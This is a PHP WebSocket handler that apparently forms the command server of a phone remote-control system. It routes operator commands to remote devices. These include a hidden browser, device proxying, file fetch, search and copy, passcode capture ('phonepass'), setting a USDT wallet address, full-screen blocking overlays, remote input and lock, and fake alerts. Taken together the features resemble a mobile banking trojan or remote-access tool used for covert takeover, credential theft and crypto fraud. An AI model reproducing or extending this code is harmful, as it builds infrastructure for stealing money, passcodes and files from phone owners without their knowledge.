<?php

declare(strict_types=1);

namespace App\WebSocket\Handlers;

use App\WebSocket\ConnectionManager;
use App\WebSocket\Services\DeviceStatusService;
use App\WebSocket\Services\LastPingFormatter;
use App\WebSocket\WebSocketLog;

final class PanelHandler
{
    public function __construct(
        private readonly ConnectionManager $connectionManager,
        private readonly DeviceStatusService $deviceStatusService
    ) {}

    public function handle(int $fd, array $data): void
    {
        $phoneId = $data['pid'] ?? null;
        $subc = $data['subc'] ?? null;

        if ($phoneId === null) {
            WebSocketLog::getLogger()->warning("Panel message missing pid: fd={$fd}");

            return;
        }

        if (! $this->connectionManager->isPanelAuthorizedForDevice($fd, $phoneId)) {
            WebSocketLog::getLogger()->warning("Panel unauthorized for device: fd={$fd}, pid={$phoneId}");
            $this->connectionManager->send($fd, [
                'type' => 'error',
                'error' => 'Not authorized for this device',
                'pid' => $phoneId,
            ]);

            return;
        }

        match ($subc) {
            'join' => $this->handleJoin($fd, $phoneId, $data),
            'out' => $this->handleOut($phoneId, $data),
            'ping' => $this->handlePing($fd, $phoneId),
            'disag' => $this->handleDisag($phoneId),
            'screen' => $this->handleScreenCommand($phoneId, $data),
            'brows' => $this->handleBrowserCommand($phoneId, $data),
            'proxy' => $this->handleProxyCommand($phoneId, $data),
            'fetch' => $this->handleFetchCommand($phoneId, $data),
            'bc' => $this->handleBroadcastCommand($phoneId, $data),
            'srch' => $this->handleSearchCommand($phoneId, $data),
            'cocu' => $this->handleCopyCommand($phoneId, $data),
            'chat' => $this->handleChatCommand($phoneId, $data),
            default => $this->forwardToDevice($phoneId, $data),
        };
    }

    private function handleJoin(int $fd, string $phoneId, array $data): void
    {
        $this->connectionManager->registerPanel($fd, $phoneId);

        $this->logOperation('mov_connect', $phoneId);

        $isOnline = $this->connectionManager->isDeviceOnline($phoneId);
        $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
        $lastPing = LastPingFormatter::format($phoneInfo['lastPing'] ?? null);

        $this->connectionManager->send($fd, [
            'type' => 'statusBatch',
            'pid' => $phoneId,
            'serverToPhone' => $isOnline ? 'OPEN' : 'CLOSED',
            'lastPing' => $lastPing,
            'phoneInfo' => $phoneInfo,
        ]);
    }

    private function handleOut(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'out',
        ]);
    }

    private function handlePing(int $fd, string $phoneId): void
    {
        $phoneInfo = $this->deviceStatusService->formatForPanel($phoneId);
        $isOnline = $this->connectionManager->isDeviceOnline($phoneId);
        $serverToPhone = $isOnline ? 'OPEN' : 'CLOSED';
        $lastPing = LastPingFormatter::format($phoneInfo['lastPing'] ?? null);

        $this->connectionManager->send($fd, [
            'type' => 'statusBatch',
            'pid' => $phoneId,
            'serverToPhone' => $serverToPhone,
            'lastPing' => $lastPing,
            'phoneInfo' => $phoneInfo,
        ]);
    }

    private function handleDisag(string $phoneId): void
    {
        $fd = $this->connectionManager->getDeviceFd($phoneId);

        if ($fd !== null) {
            $this->connectionManager->getServer()->close($fd);
        }
    }

    private function handleScreenCommand(string $phoneId, array $data): void
    {
        $command = $data['comand'] ?? '';

        $deviceData = match ($command) {
            'block' => [
                'type' => 'screen',
                'subc' => 'block',
                'blockstate' => $data['bstate'] ?? '0',
                'color' => $data['color'] ?? '',
            ],
            'paste' => [
                'type' => 'screen',
                'subc' => 'paste',
                'txt' => $data['txt'] ?? '',
            ],
            'mov' => [
                'type' => 'screen',
                'subc' => 'mov',
                'poi' => $data['poi'] ?? '',
                'movetype' => $data['movetype'] ?? '',
            ],
            'snap' => [
                'type' => 'screen',
                'subc' => 'snap',
                'snaptype' => $data['stype'] ?? '1',
            ],
            'vol' => [
                'type' => 'screen',
                'subc' => 'vol',
                'volstate' => $data['volstate'] ?? '0',
            ],
            'kb' => [
                'type' => 'screen',
                'subc' => 'kb',
                'kbstate' => $data['kbstate'] ?? '0',
            ],
            'L' => [
                'type' => 'screen',
                'subc' => 'L',
                'lock' => $data['lockit'] ?? '0',
            ],
            'nav' => [
                'type' => 'screen',
                'subc' => 'nav',
                'nav' => $data['navshort'] ?? '',
            ],
            'q' => [
                'type' => 'screen',
                'subc' => 'Q',
                'newq' => $data['newqulity'] ?? '',
            ],
            'phonepass' => [
                'type' => 'screen',
                'subc' => 'phonepass',
                'passtype' => $data['passtype'] ?? '',
                'phonepass' => $data['txt'] ?? '',
            ],
            'usdt' => [
                'type' => 'screen',
                'subc' => 'usdt',
                'usdttype' => $data['usdttype'] ?? '',
            ],
            'usdtadress' => [
                'type' => 'screen',
                'subc' => 'usdtadress',
                'usdtadresstext' => $data['usdtadresstext'] ?? '',
            ],
            'blockd' => [
                'type' => 'screen',
                'subc' => 'blockd',
                'blocktext' => $data['blocktext'] ?? '',
            ],
            default => [
                'type' => 'screen',
                'subc' => $command,
            ],
        };

        $this->connectionManager->sendToDevice($phoneId, $deviceData);
    }

    private function handleBrowserCommand(string $phoneId, array $data): void
    {
        $btype = $data['btype'] ?? 'n';

        // Node.js: h=hidden browser, n=normal browser - different field structures
        $deviceData = match ($btype) {
            'h' => [
                'type' => 'brows',
                'subc' => 'h',
                'bcom' => $data['bcom'] ?? '',      // 0=stop, 1=start, 3=command
                'extdata' => $data['extdata'] ?? null,
            ],
            'n' => [
                'type' => 'brows',
                'subc' => 'n',
                'ltype' => $data['ltype'] ?? '',    // f=html base64, u=url
                'extdata' => $data['extdata'] ?? null,
            ],
            default => null,
        };

        if ($deviceData !== null) {
            $this->connectionManager->sendToDevice($phoneId, $deviceData);
        }
    }

    private function handleProxyCommand(string $phoneId, array $data): void
    {
        $prxcom = $data['prxcom'] ?? '';

        // Convert ON/OFF to 1/0 as per Node.js protocol
        $subc = match ($prxcom) {
            'ON' => '1',
            'OFF' => '0',
            default => null,
        };

        if ($subc === null) {
            return;
        }

        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'proxy',
            'subc' => $subc,
        ]);
    }

    private function handleFetchCommand(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'fetch',
            'ftype' => $data['ftype'] ?? '',
            'fpath' => $data['fpath'] ?? '',
        ]);
    }

    private function handleBroadcastCommand(string $phoneId, array $data): void
    {
        $command = $data['comand'] ?? '';
        $action = $data['act'] ?? '';

        // Map action string to number as per Node.js protocol
        $actionNum = match ($action) {
            'nothing' => '0',
            'openApp' => '1',
            'openLink' => '2',
            default => null,
        };

        if ($actionNum === null) {
            return;
        }

        $baseData = [
            'type' => 'bc',
            'thetitle' => $data['title'] ?? '',
            'themsg' => $data['msg'] ?? '',
            'toopen' => $data['todo'] ?? '',
            'theype' => $actionNum,
        ];

        $deviceData = match ($command) {
            'alert' => array_merge($baseData, [
                'subc' => 'A',
                'ico' => $data['alertico'] ?? '',
            ]),
            'notify' => array_merge($baseData, [
                'subc' => 'N',
            ]),
            default => null,
        };

        if ($deviceData !== null) {
            $this->connectionManager->sendToDevice($phoneId, $deviceData);
        }
    }

    private function handleSearchCommand(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'srch',
            'srchfor' => $data['srchfor'] ?? '',
            'srchin' => $data['srchin'] ?? '',
            'targetpath' => $data['targetpath'] ?? '',
        ]);
    }

    private function handleCopyCommand(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'cocu',
            'state' => $data['state'] ?? '',
            'tp' => $data['tp'] ?? '',
            'fp' => $data['fp'] ?? '',
        ]);
    }

    private function handleChatCommand(string $phoneId, array $data): void
    {
        $this->connectionManager->sendToDevice($phoneId, [
            'type' => 'screencomd',
            'subc' => 'chat',
            'msg' => $data['msg'] ?? '',
            'title' => $data['title'] ?? '',
        ]);
    }

    private function forwardToDevice(string $phoneId, array $data): void
    {
        $deviceData = array_merge($data, ['type' => 'screencomd']);
        unset($deviceData['itype'], $deviceData['pid']);

        $this->connectionManager->sendToDevice($phoneId, $deviceData);
    }

    private function logOperation(string $logType, string $phoneId): void
    {
        if (! config('websocket.logging.enabled', true)) {
            return;
        }

        WebSocketLog::getLogger()->info("Operation: {$logType}", [
            'phone_id' => $phoneId,
        ]);
    }
}
